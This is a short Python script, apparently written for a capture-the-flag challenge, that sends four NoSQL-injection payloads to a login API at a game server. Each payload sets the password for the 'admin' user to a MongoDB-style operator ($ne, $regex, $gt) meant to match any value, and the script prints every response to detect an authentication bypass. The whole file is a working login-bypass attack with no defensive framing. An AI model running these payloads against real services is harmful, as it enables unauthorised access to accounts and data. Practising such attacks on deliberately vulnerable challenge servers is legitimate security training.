import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

payloads = [
    {"username": "admin", "password": {"$ne": None}},
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$gt": ""}},
]

for p in payloads:
    try:
        r = requests.post(url, json=p, headers=headers)
        print(f"Payload: {p} -> {r.status_code}")
        if r.status_code != 500:
            print(r.text)
    except Exception as e:
        print(f"Error: {e}")
